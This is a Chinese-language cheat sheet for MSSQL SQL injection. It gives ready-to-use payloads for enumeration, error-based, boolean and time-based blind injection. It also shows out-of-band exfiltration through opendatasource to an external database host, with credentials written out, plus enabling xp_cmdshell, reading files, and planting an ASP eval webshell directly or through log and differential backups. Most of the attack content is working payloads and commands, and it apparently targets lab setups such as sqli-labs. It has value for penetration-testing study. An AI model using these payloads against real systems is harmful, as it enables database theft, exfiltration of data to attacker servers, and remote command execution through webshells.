常用SQL语句

mssql数据库存在information_schema数据库的相关操作（为了兼容mysql）

获取数据库权限

select is_srvrolemember('sysadmin')
select is_srvrolemember('db_owner')
select is_srvrolemember('public')

获取系统相关信息

select @@version;  // 获取版本  
select user;  // 获取用户名
select @@servername; // 获取服务器主机名

获取数据库

select db_name(); // 当前数据库
select db_name(n); // 其他数据库,n为number类型
select name from master..sysdatabases; // 所有数据库

获取数据表

select name from sysobjects where xtype = 'u'
-- 或者，每个库都有information_schema，可以不用加test，也支持跨库查，需要注意这样查询出来使用视图的
select table_name from information_schema.tables
-- 从当前库获取表，去除视图
select table_name from information_schema.tables where table_type not in ('view');

获取字段

select name from syscolumns where id = (select id from sysobjects where name = 'users')
-- 或者
select column_name from information_schema.columns where table_name = 'users';
--或者，以下不支持跨库查询
select top 1 col_name(object_id('users'),1) from sysobjects;
-- i 为第几个字段，int型
select top 1 col_name(object_id('users'),i) from sysobjects;

获取值

select username, password from users;

查看显错点

order by n union all select null,null,……,null

mssql数据库和mysql数据库不同，联合查询必须是 union all select，查询数据时必须加上数据类型，如果不清楚就写null

数据表

  • 利用sysobjects
union all select null,null,null from sysobjects where xtype='U'

sysobjects中的id字段记录下，在syscolumns中添加查询条件id=在sysobjects中查询的id结果

  • 利用information_schema.tables
union all select null,null,table_name from information_schema.tables

字段

  • 利用syscolumns
union all select null,null,null from syscolumns where id=对应的ID
  • 利用information_schema.columns
union all select null,null,column_name from information_schema.columns

报错注入

convert()

convert() 函数是把日期转换为新数据类型的通⽤函数

convert(data_type(length),data_to_be_converted,style)

data_type(length) 转换为⽬标数据类型（带有可选的长度）

data_to_be_converted 含有需要转换的值

style 规定⽇期/时间的输出格式

-- 示例
CONVERT(VARCHAR(19),GETDATE())
CONVERT(VARCHAR(10),GETDATE(),110)
CONVERT(VARCHAR(11),GETDATE(),106)
CONVERT(VARCHAR(24),GETDATE(),113)
-- 结果
09 22 2021 11:39AM
09-22-2021 22 09
2021 22 09
2021 11:41:19:480

对于 convert(int,@@version) convert 函数⾸先会执⾏第⼆个参数指定的 SQL 查询，然后尝试将查询结果转换为 int 类型,但是，由于这个 SQL 查询的结果是 varchar 类型，⽆法进⾏指定的转换，所以，convert 函数会抛出 ⼀个 SQL server 错误消息，指出“SQL 查询结果”⽆法转换为“int”类型，这样就能得到的这个 SQL 查询的结果了

?id=1' and 1=convert(int,(db_name())) -- 123

查数据表

  • 这里的当前数据库的所有数据表可以用 test..sysobjects 或者 test.dbo.sysobjects
?id=1' and 1=convert(int,(select top 1 name from test..sysobjects where xtype='U')) -- 123

?id=1' and 1=convert(int,(select top 1 name from test.dbo.sysobjects where xtype='U' and name <> 'users')) -- 123

?id=1' and 1=convert(int,(select top 1 name from test.dbo.syscolumns where id=(select top 1 id from test.dbo.sysobjects where name='users'))) -- 123

?id=1' and 1=convert(int,(select top 1 name from test.dbo.syscolumns where id=(select top 1 id from test.dbo.sysobjects where name='users') and name <>'id')) -- 123

查询数据

?id=1' and 1=convert(int,(select top 1 password from users where 1=1 and password <> 'Dumb')) -- 123

db_name()

返回指定数据库的名称 (不存在可以使用 not in 或者 <> )

db_name([database_id])

名称 DB_NAME 将返回的数据库的标识号 (ID)

如果调用 DB_NAME 省略 database_id ，则 DB_NAME 返回当前数据库的名称。 返回 nvarchar(128)

剩下的和上面的注入过程一样

?id=1' and 1=db_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users'))) -- +

file_name()

此函数返回给定文件标识 (ID) 号的逻辑文件名

file_name(id)

其文件名的文件标识号 file_name

file_id 具有 int 数据类型。返回 nvarchar(128)

file_id 对应于 sys.master_files 目录视图或 sys.database_files 目录视图中的 file_id 列

?id=1' and 1=file_name((db_name()))--+ -- 123

1' and 1=file_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users'))) -- +

filegroup_name()

?id=1' and 1=filegroup_name((db_name()))--+ -- 123

?id=1' and 1=filegroup_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users'))) -- +

col_name()

此函数根据表列的表标识号和列标识号值返回表列的名称。

col_name(table_id，column_id)

table_id 自变量具有一个 int 数据类型

column_id 自变量具有一个 int 数据类型,返回系统名称

?id=1' and 1=col_name(1,db_name())--+ -- 123

?id=1' and 1=col_name(1,(select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users'))) -- +

object_name

返回架构范围内对象的数据库对象名称

object_name(object_id[,database_id])

object_id 的数据类型为 int，并假定为指定数据库或当前数据库上下文中的架构范围内的对象

database_id 的数据类型为 int。要在其中查找对象的数据库的 ID

返回 sysname

?id=1' and 1=object_name(1,db_name()) -- +

?id=1' and 1=object_name(1,(select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users'))) -- +

type_name()

type_name(type_id)

type_id 的数据类型为 int，它可以引用调用方有权访问的任意架构中的类型。返回 sysname

?id=1' and 1=type_name(db_name()) -- +

?id=1' and 1=type_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users'))) -- +

cast()

将表达式由一种数据类型转换为另一种数据类型。

cast(expression AS data_type[(length)])

expression 任何有效的表达式

data_type 目标数据类型，这包括 xml、bigint 和sql_variant，不能使用别名数据类型

length 指定目标数据类型长度的可选整数，适用于允许用户指定长度的数据类型，默认值为 30

?id=1' and 1=cast(db_name() as varchar) -- +

?id=1 ' and 1 = cast((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')) as varchar) -- +

schema_name()

返回与架构 ID 关联的架构名称。

schema_name([schema_id])

schema_id 架构的 ID，schema_id 是 int类型

如果没有定义 schema_id，则 schema_name 将返回调用方的默认架构的名称

schema_id 不是有效 ID 时，返回 NULL

有环境版本限制，可以尝试使用

布尔盲注

布尔盲注其实和 mysql 布尔盲注一样，通过页面对永真条件，or 1=1 与 永假条件，and 1=2 返回的内容是否存在差异，进行判断是否可以进行布尔盲注。通常返回存在/不存在两个结果（ and 1=1 / and 1=2 ），就可以判断是否存在布尔盲注

延时注入

延时函数 waitfor delay

WAITFOR 是 SQL Server 中 Transact-SQL 提供的⼀个流程控制语句。它的作⽤就是等待特定时间，然后继续执⾏后 续的语句。它包含⼀个参数 DELAY，⽤来指定等待的时间。

如果将该语句成功注⼊后，会造成数据库返回记录和 MSSQL注入 请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。

WAITFOR DELAY '0:0:n'

WAITFOR DELAY '0:0:4' // 表⽰延迟4秒

时间盲注通过页面返回的内容的响应时间差异进行条件判断，但是在 mssql 中，默认可使用堆叠查询，这个也是判断 mssql 与 mysql 的区别之一，所以在判断注入点有三种方式

直接带入查询

?id=1' waitfor delay '0:0:3'-- 123

堆叠查询判断

?id=1'; waitfor delay '0:0:3'-- 123

if 判断注入点

?id=1' if (1=1) waitfor delay '0:0:4' -- 123

?id=1' if (1=2) waitfor delay '0:0:4' -- 123

反弹注入

让被攻击者的数据库查询的数据插入到攻击者的数据库中

  1. 必须得配合堆叠注入
  2. 分号后面的数据库语句还可以执行

前提条件

  1. 公网IP
  2. 服务器、数据库

反弹注入会暴露自己IP吗 ？

需要其他网上虚拟空间搭建数据库

select * from admin;select * from passwd;

使用场景

无法闭合、延时注入、盲注、报错注入都失败，可以尝试使用反弹注入，需要用到 opendatasource 函数

注入格式

insert into opendatasource('连接的组件', 'server=连接地址, 端口;uid=账号;pwd=密码;database=数据库的名字').数据库.dbo.表 select * from 查询的表

知道表内的字段数

直接远程创建一个和想要查询的数据表相同字段的数据表

insert into opendatasource('sqloledb','server=den1.mssql7.gear.host,1433;uid=assdawqwe;pwd=Se7b77t0-!zP;database=assdawqwe').assdawqwe.dbo.mms select * from admin

不知道表内字段数

有回显

union all select count(name),null,null from syscolumns where id='对应数据表的ID'

无回显

and (select count(name) from syscolumns where id=object_id('数据表'))>1

根据所得的count(name)值去虚拟数据库创建对应字段数的数据表

?id=1'; insert into opendatasource('sqloledb','server=den1.mssql7.gear.host,1433;uid=assdawqwe;pwd=Se7b77t0-!zP;database=assdawqwe').assdawqwe.dbo.mms1 select name from sysobjects where xtype='U' -- 123

文件操作

MSSQL 的文件操作要求要有两大前提

  1. 有相应的权限 db_owner
  2. 知道文件的绝对路径

在 mssql 中有两个存储过程可以帮我们来找绝对路径：xp_cmdshell 和 xp_dirtree

查文件

xp_dirtree

execute master..xp_dirtree 'c:' --列出所有c:\文件、目录、子目录 
execute master..xp_dirtree 'c:',1 --只列c:\目录 
execute master..xp_dirtree 'c:',1,1 --列c:\目录、文件

当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中

create table tmp (dir varchar(8000),num int,num1 int); insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1;

select * from tmp;

xp_cmdshell

cmd命令查找asp文件

for /r c:\ %i in (*.asp) do echo %i

当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中 (建立一个表存一个 char 字段就可以了)

create table cmdtmp (dir varchar(8000)); 

insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\ %i in (*.asp) do echo %i';

select * from cmdtmp;

因为 xp_cmdshell 默认不会开启，需要管理员自行开启，推荐执行SQL语句开启

sp_configure 'show advanced options',1
reconfigure
go
sp_configure 'xp_cmdshell',1
reconfigure
go

读文件

读取文件可以创建一个临时表，将本地文件写入该表中（无法远程登录的情况下，使用堆叠注入）

--建立一个临时表 
create table #testtable( context ntext ); 
select * from #testtable 

--将本地文件写入表中 
BULK INSERT #testtable FROM 'c:/1.txt' WITH ( DATAFILETYPE = 'char', KEEPNULLS ) 

--drop table #testtable;

写文件

xp_cmdshell 写入 MSSQL注入shell

在得知绝对路径的情况下，使用 echo 写入 MSSQL注入shell，如果需要换行则使用 >> 追加写入，注意如=、> 等前使用 ^ 来转义

exec master..xp_cmdshell 'echo ^<%eval request("cmd")%>^ >> D:\www\mssql\mssql-lib-labs\test.asp'

提权

DB_owner 权限 LOG 备份 Getshell

无论是 LOG 备份还是差异备份，都是利用备份的过程中写入一句话木马

SQLServer 常见的备份策略

  1. 每周一次完整备份
  2. 每天一次差异备份
  3. 每小时一次事务日志备份

利用前提

  1. 目标机器存在数据库备份文件 ，也就是如果我们利用 test 数据库的话，则需要该 test 数据库存在数据库备份文件，而且恢复模式是 完整模式
  2. 知道网站的绝对路径
  3. 该注入支持堆叠注入
alter database 数据库名 set RECOVERY FULL; #修改数据库恢复模式为 完整模式 
create table cmd (a image); #创建一张表cmd，只有一个列 a，类型为image 
backup log 数据库名 to disk= 'D:\WWW\MSSQL\mssql-sqli-labs\1.asp' with init; #备份表到指定路径 
insert into cmd (a) values(0x3c256576616c20726571756573742822636d642229253e); #插入一句话到cmd表里 
backup log 数据库名 to disk='C:\Inetpub\wwwroot\sqlilabs\2.asp'; #把操作日志备份到指定文件 
drop table cmd; #删除cmd表

执行完成之后会在目标网站根目录下生成 1.asp 和 2.asp 文件，其中 1.asp 保存数据库，2.asp 就是我们需要连接的木马文件

DB_owner 权限差异备份 Getshell

差异备份有概率会把网站搞崩，所以不建议使用差异备份

利用前提

  1. 知道网站的绝对路径
  2. 该注入支持堆叠注入

以下语句一条一条执行

create table [dbo].[test] ([cmd] [image]) 
insert into [test](cmd) values(0x3c256576616c20726571756573742822636d642229253e) 
backup database test to disk = 'C:\Inetpub\wwwroot\1.asp' 
Drop table [test]
